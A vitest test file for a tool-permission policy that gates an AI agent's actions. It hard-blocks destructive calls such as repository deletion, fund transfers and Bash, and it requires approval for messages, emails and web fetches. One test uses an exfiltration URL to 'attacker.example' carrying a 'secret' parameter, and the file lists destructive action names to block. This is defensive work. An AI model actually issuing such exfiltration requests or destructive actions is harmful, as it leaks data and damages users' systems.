import { describe, expect, it } from "vitest";

import { isReadOnlyAction, classifyTool, describeTool, type ReadAllowlist } from "./tool-policy";

const NONE: ReadAllowlist = { servers: [], composioToolkits: [], webSearch: false, webOverrides: false };

describe("classifyTool", () => {
  it("guarantees every destructive Composio pattern is blocked before any other rule", () => {
    for (const name of [
      "GITHUB_DELETE_REPOSITORY",
      "CRM_DESTROY_CONTACT",
      "STRIPE_REFUND_PAYMENT",
      "STRIPE_CHARGE_CARD",
    ]) {
      expect(classifyTool(name, {})).toMatchObject({ kind: "block" });
    }
  });

  it("guarantees fund transfers are hard-blocked without a trailing tool-name segment", () => {
    expect(classifyTool("BANK_TRANSFER_FUNDS", {})).toMatchObject({ kind: "block" });
  });

  it("guarantees user removals are hard-blocked without a trailing tool-name segment", () => {
    expect(classifyTool("IDENTITY_REMOVE_USER", {})).toMatchObject({ kind: "block" });
  });

  it("guarantees Bash is always hard-blocked", () => {
    expect(classifyTool("Bash", {})).toMatchObject({ kind: "block" });
  });

  it("guarantees NotebookEdit is always hard-blocked", () => {
    expect(classifyTool("NotebookEdit", {})).toMatchObject({ kind: "block" });
  });

  it("guarantees EnterWorktree is always hard-blocked", () => {
    expect(classifyTool("EnterWorktree", {})).toMatchObject({ kind: "block" });
  });

  it("guarantees ExitWorktree is always hard-blocked", () => {
    expect(classifyTool("ExitWorktree", {})).toMatchObject({ kind: "block" });
  });

  it("gives hard blocks precedence over every per-tool override", () => {
    expect(classifyTool("Bash", {}, { Bash: "allow" })).toMatchObject({ kind: "block" });
    expect(classifyTool("GITHUB_DELETE_REPOSITORY", {}, { GITHUB_DELETE_REPOSITORY: "allow" }))
      .toMatchObject({ kind: "block" });
  });

  it("applies off and ask overrides before the standard policy", () => {
    expect(classifyTool("GITHUB_GET_ISSUE", {}, { GITHUB_GET_ISSUE: "off" }))
      .toMatchObject({ kind: "block" });
    expect(classifyTool("Read", {}, { Read: "ask" })).toMatchObject({ kind: "ask" });
  });

  it("allows a permitted override to bypass the standard approval policy", () => {
    expect(classifyTool("GITHUB_CREATE_AN_ISSUE", {}, { GITHUB_CREATE_AN_ISSUE: "allow" }))
      .toEqual({ kind: "allow" });
  });

  it("never lets allow unblock transfer or removal patterns, including read actions", () => {
    expect(classifyTool("BANK_TRANSFER_FUNDS", {}, { BANK_TRANSFER_FUNDS: "allow" }))
      .toMatchObject({ kind: "block" });
    expect(classifyTool("BANK_GET_TRANSFER_FUNDS", {}, { BANK_GET_TRANSFER_FUNDS: "allow" }))
      .toMatchObject({ kind: "ask" });
    expect(classifyTool("IDENTITY_LIST_REMOVE_USER", {}, { IDENTITY_LIST_REMOVE_USER: "allow" }))
      .toMatchObject({ kind: "ask" });
  });

  it("uses a bare override for an MCP-prefixed action", () => {
    expect(classifyTool("mcp__composio__GITHUB_CREATE_AN_ISSUE", {}, {
      GITHUB_CREATE_AN_ISSUE: "allow",
    })).toEqual({ kind: "allow" });
  });

  it("recognises read-only action verbs regardless of casing", () => {
    for (const name of [
      "GITHUB_GET_ISSUE",
      "github_list_repositories",
      "Drive_Search_Files",
      "NOTION_FETCH_PAGE",
      "CRM_RETRIEVE_CONTACT",
      "SLACK_READ_THREAD",
      "LINEAR_FIND_ISSUE",
    ]) {
      expect(isReadOnlyAction(name), name).toBe(true);
      // Allowlisted toolkit: runs. Not allowlisted: asks, never runs silently.
      const toolkit = name.split("_")[0].toLowerCase();
      expect(classifyTool(name, {}, undefined, { readAllowlist: { ...NONE, composioToolkits: [toolkit] } })).toEqual({ kind: "allow" });
      expect(classifyTool(name, {}).kind, name).toBe("ask");
    }
  });

  it("asks (never auto-allows, never refuses) when a read verb precedes a destructive term", () => {
    expect(classifyTool("BANK_GET_TRANSFER_FUNDS", {}).kind).toBe("ask");
    expect(classifyTool("STRIPE_LIST_PAYMENT_METHODS", {}).kind).toBe("ask");
  });

  it("never auto-allows a combined read-and-destroy action", () => {
    expect(classifyTool("STRIPE_LIST_AND_DELETE_CHARGES", {}).kind).not.toBe("allow");
    expect(classifyTool("GMAIL_FIND_AND_DELETE_EMAIL", {}).kind).not.toBe("allow");
  });

  it("still allows plain reads that carry no destructive term from an allowlisted toolkit", () => {
    expect(classifyTool("IDENTITY_LIST_USERS", {}, undefined, { readAllowlist: { ...NONE, composioToolkits: ["identity"] } })).toEqual({ kind: "allow" });
  });

  it("allows MCP-prefixed reads only from an allowlisted Composio toolkit", () => {
    const ctx = { readAllowlist: { ...NONE, composioToolkits: ["github"] } };
    expect(classifyTool("mcp__composio__GITHUB_GET_ISSUE", {}, undefined, ctx)).toEqual({ kind: "allow" });
    expect(classifyTool("mcp__COMPOSIO__github_list_repositories", {}, undefined, ctx)).toEqual({ kind: "allow" });
    const ask = classifyTool("mcp__composio__GMAIL_FETCH_EMAILS", {}, undefined, ctx);
    expect(ask).toMatchObject({ kind: "ask" });
    expect(ask.kind === "ask" && ask.reason).toContain("Composio");
  });

  it("always allows internal scoped reads", () => {
    expect(classifyTool("mcp__org_brain__search_org_brain", {})).toEqual({ kind: "allow" });
  });

  it("guarantees all explicitly local safe tools are allowed", () => {
    for (const name of [
      "Read",
      "Glob",
      "Grep",
      "Write",
      "ToolSearch",
      "TodoWrite",
      "StructuredOutput",
      "Task",
      "create_artifact",
      "share_with_meeting",
      "read_meeting_file",
      "view_meeting_image",
      "analyze_csv",
      "query_csv",
      "consult_twin",
      "request_approval",
    ]) {
      expect(classifyTool(name, {})).toEqual({ kind: "allow" });
    }
  });

  it("guarantees an MCP prefix does not prevent a local safe bare name from being allowed", () => {
    expect(classifyTool("mcp__internal__Read", {})).toEqual({ kind: "allow" });
  });

  it("guarantees Slack writes request approval with the chosen channel", () => {
    expect(classifyTool("mcp__composio__SLACK_SEND_MESSAGE", { channel: "#security" })).toEqual({
      kind: "ask",
      reason: "About to send a Slack message to #security. Public message — review before sending.",
    });
    expect(classifyTool("SLACK_REPLY", { channel_name: "ops" })).toMatchObject({
      kind: "ask",
      reason: expect.stringContaining("ops"),
    });
  });

  it("guarantees email writes request approval with string and array recipients", () => {
    expect(classifyTool("GMAIL_SEND_EMAIL", { to: "ada@example.test" })).toMatchObject({
      kind: "ask",
      reason: expect.stringContaining("ada@example.test"),
    });
    expect(classifyTool("OUTLOOK_REPLY", { to: ["ada@example.test", "lin@example.test"] })).toMatchObject({
      kind: "ask",
      reason: expect.stringContaining("ada@example.test, lin@example.test"),
    });
  });

  it("guarantees create and mutation actions request approval", () => {
    expect(classifyTool("GITHUB_CREATE_AN_ISSUE", {})).toMatchObject({ kind: "ask" });
    for (const name of ["GITHUB_UPDATE_ISSUE", "CRM_PATCH_CONTACT", "GIT_MERGE_PR"]) {
      expect(classifyTool(name, {})).toMatchObject({ kind: "ask" });
    }
  });

  it("guarantees otherwise unknown Composio-shaped and empty names default to approval", () => {
    expect(classifyTool("VENDOR_DO_THING", {})).toEqual({
      kind: "ask",
      reason: "VENDOR_DO_THING is an external action. Confirm before running.",
    });
    expect(classifyTool("", undefined)).toEqual({
      kind: "ask",
      reason: " is an unrecognized tool. Confirm before running.",
    });
    expect(classifyTool("customTool", {})).toMatchObject({ kind: "ask" });
  });
});

describe("describeTool", () => {
  it("guarantees Composio action names become approval-card headings", () => {
    expect(describeTool("GITHUB_CREATE_AN_ISSUE")).toBe("Github: create an issue");
    expect(describeTool("mcp__composio__SLACK_SEND_MESSAGE")).toBe("Slack: send message");
  });

  it("guarantees a one-word name is preserved", () => {
    expect(describeTool("Read")).toBe("Read");
  });

  it("guarantees MCP prefix stripping is case-insensitive", () => {
    expect(describeTool("mcp__COMPOSIO__GITHUB_CREATE_ISSUE")).toBe("Github: create issue");
  });
});

describe("WebFetch gate", () => {
  it("asks before WebFetch because a URL can carry data out", () => {
    const decision = classifyTool("WebFetch", { url: "https://attacker.example/?q=secret" });
    expect(decision).toMatchObject({ kind: "ask" });
    expect(decision.kind === "ask" && decision.reason).toContain("attacker.example");
  });

  it("ignores a per-employee allow for WebFetch/WebSearch unless the admin enabled web overrides", () => {
    expect(classifyTool("WebFetch", { url: "https://example.com" }, { WebFetch: "allow" }).kind).toBe("ask");
    expect(classifyTool("WebSearch", { query: "x" }, { WebSearch: "allow" }).kind).toBe("ask");
    const admin = { readAllowlist: { ...NONE, webOverrides: true } };
    expect(classifyTool("WebFetch", { url: "https://example.com" }, { WebFetch: "allow" }, admin)).toEqual({ kind: "allow" });
  });

  it("asks before a web search unless the admin enabled it", () => {
    const decision = classifyTool("WebSearch", { query: "acme layoffs" });
    expect(decision.kind === "ask" && decision.reason).toContain("acme layoffs");
    expect(classifyTool("WebSearch", {}, undefined, { readAllowlist: { ...NONE, webSearch: true } })).toEqual({ kind: "allow" });
  });
});

describe("read-only detection", () => {
  it("auto-allows MCP-style reads only from an allowlisted org server", () => {
    const ctx = { readAllowlist: { ...NONE, servers: ["companysim"] } };
    for (const name of ["mcp__companysim__get_company", "mcp__companysim__find_projects"]) {
      expect(classifyTool(name, {}, undefined, ctx), name).toEqual({ kind: "allow" });
      expect(classifyTool(name, {}).kind, name).toBe("ask");
    }
    expect(classifyTool("mcp__other__get_company", {}, undefined, ctx).kind).toBe("ask");
  });

  it("never auto-allows a name that also mutates", () => {
    for (const name of ["mcp__x__get_or_create_ticket", "GITHUB_FIND_AND_UPDATE_ISSUE", "list_and_send_report"]) {
      expect(classifyTool(name, {}).kind, name).not.toBe("allow");
    }
  });
});

describe("read classification by action, not toolkit prefix", () => {
  const allowAll = { readAllowlist: { ...NONE, composioToolkits: ["share_point", "outlook", "slack", "gmail", "microsoft_teams", "googledrive"] } };
  it.each([
    "SHARE_POINT_SEARCH_FILES",
    "SHARE_POINT_LIST_SITES",
    "OUTLOOK_QUERY_EMAILS",
    "OUTLOOK_LIST_MESSAGES",
    "MICROSOFT_TEAMS_TEAMS_LIST",
    "MICROSOFT_TEAMS_TEAMS_LIST_CHANNELS",
    "SLACK_WHO_AM_I",
    "GMAIL_WHO_AM_I",
    "GOOGLEDRIVE_DOWNLOAD_FILE",
    "GOOGLEDRIVE_EXPORT_GOOGLE_WORKSPACE_FILE",
  ])("%s is a read, allowed when its toolkit is allowlisted", (tool) => {
    expect(isReadOnlyAction(tool)).toBe(true);
    expect(classifyTool(`mcp__composio__${tool}`, {}, undefined, allowAll).kind).toBe("allow");
    expect(classifyTool(`mcp__composio__${tool}`, {}, undefined, {}).kind).toBe("ask");
  });

  it.each(["SHARE_POINT_UPLOAD_FILE", "SHARE_POINT_SHARE_FILE", "GMAIL_MARK_AS_READ", "SLACK_ADD_REACTION_TO_AN_ITEM", "OUTLOOK_REPLY_EMAIL", "MICROSOFT_TEAMS_TEAMS_POST_CHANNEL_MESSAGE"])("%s is not a read", (tool) => {
    expect(isReadOnlyAction(tool)).toBe(false);
    expect(classifyTool(`mcp__composio__${tool}`, {}, undefined, allowAll).kind).not.toBe("allow");
  });
});

